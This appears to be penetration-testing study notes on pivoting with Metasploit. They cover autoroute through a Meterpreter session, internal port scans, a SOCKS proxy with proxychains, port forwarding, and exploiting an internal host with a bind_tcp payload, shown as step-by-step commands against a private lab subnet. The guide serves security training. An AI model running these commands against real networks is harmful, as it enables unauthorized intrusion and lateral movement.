# Pivoting in Metasploit â€“ Complete Guide

## ðŸ” What Is Pivoting?

Using a compromised host as a **bridge** to reach systems on its internal network that are **not directly accessible** from your attacker machine.

> ðŸ’¡ **Key Insight**:  
> The compromised host must have **multiple network interfaces** (e.g., public IP + private subnet).

---
## ðŸ§­ Pivoting Workflow

### Phase 1: Discover Internal Networks

```msf
meterpreter > ipconfig
```

âœ… Look for **non-public IPs** (e.g., `192.168.x.x`, `10.x.x.x`, `172.16-31.x.x`)

> âš ï¸ **Critical**: Without an internal IP â†’ no pivoting possible

---
### Phase 2: Add Route Through Compromised Host

```msf
meterpreter > run autoroute -s 192.168.99.0/24
[*] Adding route to 192.168.99.0/255.255.255.0...
```

- `-s`: Target subnet (CIDR notation)  
- Routes **all Metasploit traffic** for this subnet through the Meterpreter session

> ðŸ”¥ **Golden Rule**:  
> `autoroute` **only works for Metasploit modules** (not external tools like `nmap`)

---
### Phase 3: Background Session & Verify Route

```msf
meterpreter > background
msf6 > route print
```

âœ… Output shows route added:
```
Subnet             Netmask            Gateway
------             -------            -------
192.168.99.0       255.255.255.0      Session 1
```

---
### Phase 4: Scan Internal Network (Metasploit Modules Only)

```msf
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.99.0/24
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 22,80,445
msf6 auxiliary(scanner/portscan/tcp) > run
```

âœ… Scans internal hosts **through the pivot** â€” no extra setup needed

> ðŸ’¡ **Why this works**: Metasploit modules automatically use routes from `route print`

---
## âš ï¸ Critical Distinction: Metasploit vs. External Tools

| Tool Type              | Example                          | Requires                      | Why                                         |
| ---------------------- | -------------------------------- | ----------------------------- | ------------------------------------------- |
| **Metasploit modules** | `auxiliary/scanner/portscan/tcp` | `autoroute` only              | Metasploit knows its own routing table      |
| **External tools**     | `nmap`, `curl`, `smbclient`      | `autoroute` + **SOCKS proxy** | External tools don't know Metasploit routes |
# Confusions explained below
### For External Tools: Set Up SOCKS Proxy

```msf
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > run
```

Then on Kali:
```bash
proxychains nmap -sT -Pn 192.168.99.20
proxychains curl http://192.168.99.20
```

> âš ï¸ **Never use `-sS` (SYN scan) with proxychains** â€” use `-sT` (TCP connect scan)

---
## ðŸ”§ Advanced: Port Forwarding (For Single Services)

When you only need to access **one port** on an internal host:

```msf
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.99.20
```

- `-l 8080`: Local port on your Kali machine  
- `-p 80`: Target port on internal host  
- `-r 192.168.99.20`: Internal host IP  

âœ… Now access via: `http://localhost:8080` on your Kali machine

> ðŸ’¡ **Use case**: Accessing a web app on an internal host without full network access

---
## ðŸš€ Exploiting Internal Hosts

### Critical Payload Selection

| Scenario | Payload | Why |
|----------|---------|-----|
| **Internal host can reach you** | `reverse_tcp` | Standard reverse shell |
| **Internal host isolated (no outbound)** | `bind_tcp` | Opens port on target â†’ you connect to it |

### Example: Exploiting Isolated Host

```msf
msf6 > use exploit/windows/http/badblue_passthru
msf6 exploit(...) > set RHOSTS 192.168.99.20
msf6 exploit(...) > set RPORT 80
msf6 exploit(...) > set payload windows/meterpreter/bind_tcp
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > exploit
```

âœ… Connects to target's **bind shell** through the pivot

---
## ðŸ§¹ Cleanup

```msf
# Remove port forward
meterpreter > portfwd delete -l 8080 -p 80 -r 192.168.99.20

# Remove route
msf6 > route delete 192.168.99.0 255.255.255.0

# Kill SOCKS proxy
msf6 > jobs -K
```

---
## ðŸ”‘ Key Takeaways

| Concept | Explanation |
|---------|-------------|
| **`autoroute`** | Routes Metasploit traffic through compromised host |
| **SOCKS proxy** | Required for external tools (`nmap`, `curl`) |
| **Port forwarding** | For single-service access (e.g., web apps) |
| **Bind payloads** | Required when internal host can't reach your IP |
| **Route persistence** | Routes die when Meterpreter session dies â†’ re-add after reboot |

> ðŸ”¥ **Golden Rules**:  
> 1. **Always run `ipconfig` first** â€” no internal IP = no pivot  
> 2. **Metasploit modules = `autoroute` only**  
> 3. **External tools = `autoroute` + SOCKS proxy**  
> 4. **Isolated targets = `bind_tcp` payloads**

---
---
#### To understand why we need a SOCKS proxy and why we use Port 1080, think of it like this:

### 1. The "Language" Barrier

- **Metasploit Modules** (like `postscan/tcp`) are "family." They can see the `autoroute` table you created. They know exactly how to send traffic through your Meterpreter session.
<br>
- **External Tools** (like `nmap`, `firefox`, or `curl`) are "strangers." They have no idea Metasploit even exists. If you tell `nmap` to scan `192.168.99.20`, it tries to send that traffic out through your Kali machine's physical network cardâ€”and it fails because your Kali machine isn't physically on that internal network.

---
### 2. What is a SOCKS Proxy?

A **SOCKS Proxy** acts as a **Tunnel Entrance**.

When you run `auxiliary/server/socks_proxy` in Metasploit, you are opening a "doorway" on your Kali machine.

1. You tell an external tool (like `nmap`) to go through that doorway.
<br>
2. The doorway leads directly into Metasploit.
<br>
3. Metasploit looks at its `autoroute` table and says, "Oh, I know where this goes!" and sends the traffic through the Meterpreter session to the target.
### 3. Why Port 1080?

**Port 1080** is simply the **standard, default port** for SOCKS proxies.

- It's like how Web traffic usually uses Port 80 and SSH uses Port 22.
<br>
- You _can_ change it to any port you want (like 9050 or 8888), but 1080 is the convention.
<br>
- When you use **Proxychains**, it looks for this port to know where the "tunnel entrance" is.